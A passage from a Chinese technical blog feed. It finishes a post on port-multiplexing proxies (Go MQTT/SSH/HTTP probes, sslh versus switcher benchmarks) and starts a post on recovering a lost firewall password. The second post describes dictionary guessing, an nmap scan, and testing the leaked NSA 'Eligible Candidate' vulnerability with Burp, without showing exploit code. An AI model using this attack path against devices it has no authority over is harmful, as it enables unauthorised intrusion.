+<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">"ssh"</span>:</div><div class="line">	service = <span class="string">"prefix"</span></div><div class="line">	p = &amp;PREFIX&#123;ps.BaseConfig, []<span class="keyword">string</span>&#123;<span class="string">"SSH"</span>&#125;&#125;</div><div class="line"><span class="keyword">case</span> <span class="string">"http"</span>:</div><div class="line">	service = <span class="string">"prefix"</span></div><div class="line">	p = &amp;PREFIX&#123;ps.BaseConfig, []<span class="keyword">string</span>&#123;<span class="string">"GET "</span>, <span class="string">"POST "</span>, <span class="string">"PUT "</span>, <span class="string">"DELETE "</span>, <span class="string">"HEAD "</span>, <span class="string">"OPTIONS "</span>&#125;&#125;</div></pre></td></tr></table></figure>
+<p>特殊的协议还是需要单独实现的。比如说，我所需要的MQTT协议就无法通过简单的字符串比对或者正则表达式方式来进行识别。因为它没有既定的模式，结构也不是固定长度。MQTT协议识别实现如下：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *MQTT)</span> <span class="title">Probe</span><span class="params">(header []<span class="keyword">byte</span>)</span> <span class="params">(result ProbeResult, address <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	<span class="keyword">if</span> header[<span class="number">0</span>] != <span class="number">0x10</span> &#123;</div><div class="line">		<span class="keyword">return</span> UNMATCH, <span class="string">""</span></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(header) &lt; <span class="number">13</span> &#123;</div><div class="line">		<span class="keyword">return</span> TRYAGAIN, <span class="string">""</span></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	i := <span class="number">1</span></div><div class="line">	<span class="keyword">for</span> ; ; i++ &#123;</div><div class="line">		<span class="keyword">if</span> header[i]&amp;<span class="number">0x80</span> == <span class="number">0</span> &#123;</div><div class="line">			<span class="keyword">break</span></div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">if</span> i == <span class="number">4</span> &#123;</div><div class="line">			<span class="keyword">return</span> UNMATCH, <span class="string">""</span></div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	i++</div><div class="line"></div><div class="line">	<span class="keyword">if</span> bytes.Compare(header[i:i+<span class="number">8</span>], []<span class="keyword">byte</span>(<span class="string">"\x00\x06MQIsdp"</span>)) == <span class="number">0</span> || bytes.Compare(header[i:i+<span class="number">6</span>], []<span class="keyword">byte</span>(<span class="string">"\x00\x04MQTT"</span>)) == <span class="number">0</span> &#123;</div><div class="line">		<span class="keyword">return</span> MATCH, s.Address</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> UNMATCH, <span class="string">""</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>配置文件采用了json格式，主要是为了方便和灵活。下面是一个示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    &quot;listen&quot;: &quot;:80&quot;,</div><div class="line">    &quot;default&quot;: &quot;127.0.0.1:80&quot;,</div><div class="line">    &quot;timeout&quot;: 1,</div><div class="line">    &quot;connect_timeout&quot;: 1,</div><div class="line">    &quot;protocols&quot;: [</div><div class="line">        &#123;</div><div class="line">            &quot;service&quot;: &quot;ssh&quot;,</div><div class="line">            &quot;addr&quot;: &quot;127.0.0.1:22&quot;</div><div class="line">        &#125;,</div><div class="line">        &#123;</div><div class="line">            &quot;service&quot;: &quot;mqtt&quot;,</div><div class="line">            &quot;addr&quot;: &quot;127.0.0.1:1883&quot;</div><div class="line">        &#125;,</div><div class="line">        &#123;</div><div class="line">            &quot;name&quot;: &quot;custom_http&quot;,</div><div class="line">            &quot;service&quot;: &quot;regex&quot;,</div><div class="line">            &quot;addr&quot;: &quot;127.0.0.1:8080&quot;,</div><div class="line">            &quot;patterns&quot;: [</div><div class="line">                &quot;^(GET|POST|PUT|DELETE|HEAD|\\x79PTIONS) &quot;</div><div class="line">            ]</div><div class="line">        &#125;,</div><div class="line">        &#123;</div><div class="line">            &quot;service&quot;: &quot;prefix&quot;,</div><div class="line">            &quot;addr&quot;: &quot;127.0.0.1:8081&quot;,</div><div class="line">            &quot;patterns&quot;: [</div><div class="line">                &quot;GET &quot;,</div><div class="line">                &quot;POST &quot;</div><div class="line">            ]</div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>首先准备一个简单的Web服务应用。之前用Python+bjoern写过一个简易脚本，用来自己测试网络带宽，但找了半天没找着。干脆用Go语言重新弄了一个，功能是根据传入参数值N，返回N个字符。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"bytes"</span></div><div class="line">	<span class="string">"flag"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"log"</span></div><div class="line">	<span class="string">"net/http"</span></div><div class="line">	<span class="string">"regexp"</span></div><div class="line">	<span class="string">"strconv"</span></div><div class="line">	<span class="string">"strings"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">defaultHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</div><div class="line">	<span class="keyword">if</span> r.URL.Path == <span class="string">"/"</span> &#123;</div><div class="line">		fmt.Fprintln(w, <span class="string">"It works."</span>)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	myHandler(w, r)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">myHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</div><div class="line">	re := regexp.MustCompile(<span class="string">`^/(\d+)([kKmMgGtT]?)$`</span>)</div><div class="line">	match := re.FindStringSubmatch(r.URL.Path)</div><div class="line">	<span class="keyword">if</span> match == <span class="literal">nil</span> &#123;</div><div class="line">		http.NotFound(w, r)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	buffSize := <span class="number">20480</span></div><div class="line">	buff := bytes.Repeat([]<span class="keyword">byte</span>&#123;<span class="string">'X'</span>&#125;, buffSize)</div><div class="line"></div><div class="line">	size, _ := strconv.ParseInt(match[<span class="number">1</span>], <span class="number">10</span>, <span class="number">64</span>)</div><div class="line">	<span class="keyword">switch</span> strings.ToLower(match[<span class="number">2</span>]) &#123;</div><div class="line">	<span class="keyword">case</span> <span class="string">"k"</span>:</div><div class="line">		size *= <span class="number">1</span> &lt;&lt; <span class="number">10</span></div><div class="line">	<span class="keyword">case</span> <span class="string">"m"</span>:</div><div class="line">		size *= <span class="number">1</span> &lt;&lt; <span class="number">20</span></div><div class="line">	<span class="keyword">case</span> <span class="string">"g"</span>:</div><div class="line">		size *= <span class="number">1</span> &lt;&lt; <span class="number">30</span></div><div class="line">	<span class="keyword">case</span> <span class="string">"t"</span>:</div><div class="line">		size *= <span class="number">1</span> &lt;&lt; <span class="number">40</span></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	w.Header().Set(<span class="string">"Content-Length"</span>, strconv.FormatInt(size, <span class="number">10</span>))</div><div class="line">	<span class="keyword">for</span> buffSize := <span class="keyword">int64</span>(buffSize); size &gt;= buffSize; size -= buffSize &#123;</div><div class="line">		w.Write(buff)</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> size &gt; <span class="number">0</span> &#123;</div><div class="line">		w.Write(bytes.Repeat([]<span class="keyword">byte</span>&#123;<span class="string">'X'</span>&#125;, <span class="keyword">int</span>(size)))</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	portPtr := flag.Int(<span class="string">"port"</span>, <span class="number">8080</span>, <span class="string">"监听端口"</span>)</div><div class="line"></div><div class="line">	flag.Parse()</div><div class="line"></div><div class="line">	http.HandleFunc(<span class="string">"/"</span>, defaultHandler)</div><div class="line">	err := http.ListenAndServe(fmt.Sprintf(<span class="string">":%d"</span>, *portPtr), <span class="literal">nil</span>)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		log.Fatal(<span class="string">"ListenAndServe: "</span>, err)</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>编译运行，测试Web服务器运行正常。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ go build test.go</div><div class="line">$ ./<span class="built_in">test</span> -port 9999 &amp;</div><div class="line">$ curl localhost:9999/1</div><div class="line">X</div><div class="line">$ curl localhost:9999/10</div><div class="line">XXXXXXXXXX</div><div class="line">$ curl -o /dev/null localhost:9999/10g</div><div class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</div><div class="line">                                 Dload  Upload   Total   Spent    Left  Speed</div><div class="line">100 10.0G  100 10.0G    0     0  1437M      0  0:00:07  0:00:07 --:--:-- 1469M</div></pre></td></tr></table></figure>
+<p>类似于上面的演示过程，我用curl下载大文件来测试网络I/O速率。当然本次测试过程并没有经过物理网卡，而是直接通过了loopback接口。这样可以更客观的比对在经过代理后，速度下降的幅度。</p>
+<p>另外，采用类似Apache的ab压力测试工具，测试高并发情况下的Web响应速度。这里，我使用了比ab更变态的boom。它是一款Go语言实现的开源压测软件，最近刚更名为hey，主页上称因其与Python版压力测试工具<a href="https://github.com/tarekziade/boom" target="_blank" rel="external">Boom!</a>名称冲突。安装和使用都很简单：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$ go get -u github.com/rakyll/hey</div><div class="line">$ <span class="variable">$GOPATH</span>/bin/hey http://localhost:9999/1</div><div class="line">......</div><div class="line">All requests done.</div><div class="line"></div><div class="line">Summary:</div><div class="line">  Total:        0.0223 secs</div><div class="line">  Slowest:      0.0182 secs</div><div class="line">  Fastest:      0.0002 secs</div><div class="line">  Average:      0.0039 secs</div><div class="line">  Requests/sec: 8962.9371</div><div class="line">  Total data:   200 bytes</div><div class="line">  Size/request: 1 bytes</div><div class="line">......</div></pre></td></tr></table></figure>
+<p>下载安装我修改过的Switcher版本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ go get github.com/jackyspy/switcher</div></pre></td></tr></table></figure>
+<p>sslh运行的命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo sslh-select -n -p 127.0.0.1:9998 --ssh 127.0.0.1:22 --http 127.0.0.1:9999</div></pre></td></tr></table></figure>
+<p>测试Switcher采用下面的配置文件default.cfg：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    &quot;listen&quot;: &quot;:9997&quot;,</div><div class="line">    &quot;default&quot;: &quot;127.0.0.1:22&quot;,</div><div class="line">    &quot;timeout&quot;: 1,</div><div class="line">    &quot;connect_timeout&quot;: 1,</div><div class="line">    &quot;protocols&quot;: [</div><div class="line">        &#123;</div><div class="line">            &quot;service&quot;: &quot;ssh&quot;,</div><div class="line">            &quot;addr&quot;: &quot;127.0.0.1:22&quot;</div><div class="line">        &#125;,</div><div class="line">        &#123;</div><div class="line">            &quot;service&quot;: &quot;http&quot;,</div><div class="line">            &quot;addr&quot;: &quot;127.0.0.1:9999&quot;</div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>测试过程主要用到下面两条命令，测试sslh和switcher时更改端口号即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl -o /dev/null localhost:9999/10g</div><div class="line">$ $GOPATH/bin/hey -n 100000 http://localhost:9999/1</div></pre></td></tr></table></figure>
+<p>OK，万事俱备，只待开测。</p>
+<h3 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h3><p>测试分为两块，一是测试大文件下载速率，为了不受限于网卡速率，在本机测试。另一块是测试Web请求并发量，在另一台电脑上发起测试。</p>
+<p>为了减少人工操作量，简单用Python写了一段代码，用于多次测试速度并输出结果：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</div><div class="line"><span class="keyword">import</span> itertools</div><div class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_speed</span><span class="params">(port)</span>:</span></div><div class="line">    cmd = <span class="string">'curl -o /dev/null -s -w %&#123;&#123;speed_download&#125;&#125; localhost:&#123;&#125;/10g'</span>.format(port)  <span class="comment"># noqa</span></div><div class="line">    speed = check_output(cmd.split())</div><div class="line">    <span class="keyword">return</span> float(speed)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_multi_times</span><span class="params">(port, times)</span>:</span></div><div class="line">    <span class="keyword">return</span> map(get_speed, itertools.repeat(port, times))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_speed</span><span class="params">(speed)</span>:</span></div><div class="line">    <span class="keyword">return</span> str(int(<span class="number">0.5</span> + speed / <span class="number">1024</span> / <span class="number">1024</span>))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    testcases = &#123;</div><div class="line">        <span class="string">'Direct'</span>: <span class="number">9999</span>,</div><div class="line">        <span class="string">'sslh'</span>: <span class="number">9998</span>,</div><div class="line">        <span class="string">'switcher'</span>: <span class="number">9997</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    count = <span class="number">10</span></div><div class="line"></div><div class="line">    print(<span class="string">'| Target | &#123;&#125; | Avg | '</span>.format(</div><div class="line">        <span class="string">' | '</span>.join(str(x) <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, count + <span class="number">1</span>))))</div><div class="line">    print(<span class="string">' --: '</span>.join(<span class="string">'|'</span> * (count + <span class="number">3</span>)))</div><div class="line">    <span class="keyword">for</span> name, port <span class="keyword">in</span> testcases.items():</div><div class="line">        speed_list = test_multi_times(port, count)</div><div class="line">        speed_list.append(sum(speed_list) / len(speed_list))</div><div class="line">        print(<span class="string">'|&#123;&#125;|&#123;&#125;|'</span>.format(name, <span class="string">'|'</span>.join(map(format_speed, speed_list))))</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<p>运行后得到结果如下（速度单位是MB/s）：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:right">Target</th>
+<th style="text-align:right">1</th>
+<th style="text-align:right">2</th>
+<th style="text-align:right">3</th>
+<th style="text-align:right">4</th>
+<th style="text-align:right">5</th>
+<th style="text-align:right">6</th>
+<th style="text-align:right">7</th>
+<th style="text-align:right">8</th>
+<th style="text-align:right">9</th>
+<th style="text-align:right">10</th>
+<th style="text-align:right">Avg</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:right">switcher</td>
+<td style="text-align:right">870</td>
+<td style="text-align:right">876</td>
+<td style="text-align:right">924</td>
+<td style="text-align:right">915</td>
+<td style="text-align:right">885</td>
+<td style="text-align:right">928</td>
+<td style="text-align:right">904</td>
+<td style="text-align:right">880</td>
+<td style="text-align:right">909</td>
+<td style="text-align:right">898</td>
+<td style="text-align:right">899</td>
+</tr>
+<tr>
+<td style="text-align:right">sslh</td>
+<td style="text-align:right">866</td>
+<td style="text-align:right">865</td>
+<td style="text-align:right">860</td>
+<td style="text-align:right">880</td>
+<td style="text-align:right">865</td>
+<td style="text-align:right">861</td>
+<td style="text-align:right">866</td>
+<td style="text-align:right">863</td>
+<td style="text-align:right">864</td>
+<td style="text-align:right">856</td>
+<td style="text-align:right">865</td>
+</tr>
+<tr>
+<td style="text-align:right">Direct</td>
+<td style="text-align:right">1446</td>
+<td style="text-align:right">1505</td>
+<td style="text-align:right">1392</td>
+<td style="text-align:right">1362</td>
+<td style="text-align:right">1423</td>
+<td style="text-align:right">1419</td>
+<td style="text-align:right">1395</td>
+<td style="text-align:right">1492</td>
+<td style="text-align:right">1412</td>
+<td style="text-align:right">1427</td>
+<td style="text-align:right">1427</td>
+</tr>
+</tbody>
+</table>
+<p>可以看出经过代理后，下行速率有明显下降。其中sslh比switcher略低，差异不是太大。</p>
+<p>同样的，为了方便测试并发请求响应，也写了一个脚本来完成：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"># coding=utf-8</div><div class="line">from __future__ import print_function</div><div class="line">import itertools</div><div class="line">from subprocess import check_output</div><div class="line"></div><div class="line"></div><div class="line">def get_speed(url):</div><div class="line">    cmd = &quot;hey -n 100000 -c 50 &#123;&#125;  | grep &apos;Requests/sec&apos;&quot;.format(url)  # noqa</div><div class="line">    output = check_output(cmd, shell=True)</div><div class="line">    return float(output.partition(&apos;:&apos;)[2])</div><div class="line"></div><div class="line"></div><div class="line">def test_multi_times(url, times):</div><div class="line">    return map(get_speed, itertools.repeat(url, times))</div><div class="line"></div><div class="line"></div><div class="line">def main():</div><div class="line">    testcases = &#123;</div><div class="line">        &apos;Direct&apos;: &apos;http://x.x.x.x:9999/1&apos;,</div><div class="line">        &apos;sslh&apos;: &apos;http://x.x.x.x:9998/1&apos;,</div><div class="line">        &apos;switcher&apos;: &apos;http://x.x.x.x:9997/1&apos;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    count = 10</div><div class="line"></div><div class="line">    print(&apos;| Target | &#123;&#125; | Average | &apos;.format(</div><div class="line">        &apos; | &apos;.join(str(x) for x in range(1, count + 1))))</div><div class="line">    print(&apos; --: &apos;.join(&apos;|&apos; * (count + 3)))</div><div class="line">    for name, port in testcases.items():</div><div class="line">        speed_list = test_multi_times(port, count)</div><div class="line">        speed_list.append(sum(speed_list) / len(speed_list))</div><div class="line">        print(&apos;|&#123;&#125;|&#123;&#125;|&apos;.format(name, &apos;|&apos;.join(&apos;&#123;:.0f&#125;&apos;.format(x + 0.5)</div><div class="line">                                              for x in speed_list)))</div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<p>运行后得到结果如下（速度单位是Requests/s）：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:right">Target</th>
+<th style="text-align:right">1</th>
+<th style="text-align:right">2</th>
+<th style="text-align:right">3</th>
+<th style="text-align:right">4</th>
+<th style="text-align:right">5</th>
+<th style="text-align:right">6</th>
+<th style="text-align:right">7</th>
+<th style="text-align:right">8</th>
+<th style="text-align:right">9</th>
+<th style="text-align:right">10</th>
+<th style="text-align:right">Average</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:right">switcher</td>
+<td style="text-align:right">14367</td>
+<td style="text-align:right">14886</td>
+<td style="text-align:right">15144</td>
+<td style="text-align:right">14289</td>
+<td style="text-align:right">15456</td>
+<td style="text-align:right">14834</td>
+<td style="text-align:right">14871</td>
+<td style="text-align:right">14951</td>
+<td style="text-align:right">14610</td>
+<td style="text-align:right">14865</td>
+<td style="text-align:right">14827</td>
+</tr>
+<tr>
+<td style="text-align:right">sslh</td>
+<td style="text-align:right">13892</td>
+<td style="text-align:right">14281</td>
+<td style="text-align:right">14469</td>
+<td style="text-align:right">14352</td>
+<td style="text-align:right">14468</td>
+<td style="text-align:right">14132</td>
+<td style="text-align:right">14510</td>
+<td style="text-align:right">14565</td>
+<td style="text-align:right">14633</td>
+<td style="text-align:right">14555</td>
+<td style="text-align:right">14386</td>
+</tr>
+<tr>
+<td style="text-align:right">Direct</td>
+<td style="text-align:right">20494</td>
+<td style="text-align:right">20110</td>
+<td style="text-align:right">20558</td>
+<td style="text-align:right">19519</td>
+<td style="text-align:right">19467</td>
+<td style="text-align:right">19891</td>
+<td style="text-align:right">19777</td>
+<td style="text-align:right">19682</td>
+<td style="text-align:right">20737</td>
+<td style="text-align:right">20396</td>
+<td style="text-align:right">20063</td>
+</tr>
+</tbody>
+</table>
+<p>类似前面的测试，RPS在经过代理后也存在较明显下降。sslh比switcher略低，差异不大。</p>
+<h2 id="更多应用场景-？？"><a href="#更多应用场景-？？" class="headerlink" title="更多应用场景 ？？"></a>更多应用场景 ？？</h2><p>本文描述的网络端口复用，其实现方式本质上还是一个TCP应用代理。基于这一点，我们还可以扩展出很多其他的应用场景。</p>
+<p>我想到的一种场景是动态IP认证。我们对HTTP和SSH进行复用，默认情况下HTTP可以被所有人访问，但SSH却需要通过IP地址认证后才会进行包转发。跟iptables等防火墙实现的IP地址访问规则不同，它是在应用层面来进行限制的，具有很强的灵活性，可以通过程序动态增加和删除。比如说，我通过手机浏览器访问特定的鉴权页面，通过验证后，系统自动将我当前在用的公网IP地址加入到访问列表，然后就能够顺利地通过SSH访问服务器了。连接建立后，可以将临时IP地址从访问列表中剔除，从一定程度上加强了服务器安全。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;本文所讨论的网络端口复用并非指网络编程中采用SO_REUSEADDR选项的 Socket Bind 复用。它更像是一个带特定路由功能的端口转发工具，在应用层实现。&lt;/p&gt;
+&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=
+    
+    </summary>
+    
+      <category term="网络" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C/"/>
+    
+    
+      <category term="Go" scheme="http://yoursite.com/tags/Go/"/>
+    
+      <category term="网络" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C/"/>
+    
+      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
+    
+      <category term="端口复用" scheme="http://yoursite.com/tags/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8/"/>
+    
+      <category term="sslh" scheme="http://yoursite.com/tags/sslh/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>防火墙密码恢复手记</title>
+    <link href="http://yoursite.com/2016/10/20/Password-Recovering-of-TopSec-Firewall/"/>
+    <id>http://yoursite.com/2016/10/20/Password-Recovering-of-TopSec-Firewall/</id>
+    <published>2016-10-20T09:29:18.000Z</published>
+    <updated>2016-11-10T02:46:30.857Z</updated>
+    
+    <content type="html"><![CDATA[<p>公司在用的一款防火墙，密码意外遗失，无法登陆管理平台。虽然防火墙可以正常工作，但却无法修改配置，不能根增加和删除访问列表中的IP地址，不能调整访问策略。防火墙默认仅开通https web管理界面，未开启telnet、ssh等其他管理通道。</p>
+<p>联系厂家寻求技术支持，被告知必须返厂更换芯片，费用大约在2000元左右（网上搜了一下，几乎所有密码遗失的客户最终都只能选择返厂）。公司用于该网络联网的仅此一台防火墙设备，终端数量在500以上，无其他硬件备份方案。因用户众多，管理要求细致，防火墙配置非常复杂，保存的配置文件也不是最新的。若返厂维修的话，则无法找到完备的替代方案。</p>
+<p>于是决定先自己想办法，开启密码恢复之旅。Go！</p>
+<h3 id="猜测密码，自动验证"><a href="#猜测密码，自动验证" class="headerlink" title="猜测密码，自动验证"></a>猜测密码，自动验证</h3><p>首先想到的是根据可能的密码规则和常用组合，构造一个密码字典，通过编写简单的Python脚本进行登录验证。万一不行的话，就穷举来尝试暴力破解。</p>
+<p>可是开始跑脚本的时候发现想法实在太天真了，存在两个致命的问题：</p>
+<ol>
+<li>防火墙白天负荷过重，Web响应非常慢。有时候一个请求可能在半分钟以上。</li>
+<li>Web管理平台有登录次数限制，大约6次密码错误以后，就会锁定账号一段时间。</li>
+</ol>
+<p>在尝试了几十个最可能出现的密码组合后，彻底放弃了这条捷径。</p>
+<p>看来偷懒是不成了，必须得动真格的。</p>
+<h3 id="搜寻漏洞，获取控制权"><a href="#搜寻漏洞，获取控制权" class="headerlink" title="搜寻漏洞，获取控制权"></a>搜寻漏洞，获取控制权</h3><p>nmap扫描发现防火墙只开通了https端口。不是专业的安全研究人员，只能在网上搜索该款防火墙的漏洞资料，不(suo)幸的是，还真发现了不少。</p>
+<p>找到的第一篇文章提到了Heartbleed漏洞，却未对漏洞利用方式做过多解释。需要更多学习资料，根据这个方向继续搜索，又找到了一些文章。其中，NSA Equation Group那篇文章信息量最高，对漏洞的特征和产生的原因分析的非常透彻，利用方式也做了简要说明。由于该设备尚未按厂家要求进行“方程式”漏洞修复升级，按照文章的提示，用Brup进行Eligible Candidate漏洞测试（打算用Postman，但因chrome的https证书问题放弃），漏洞果然还在！</p>
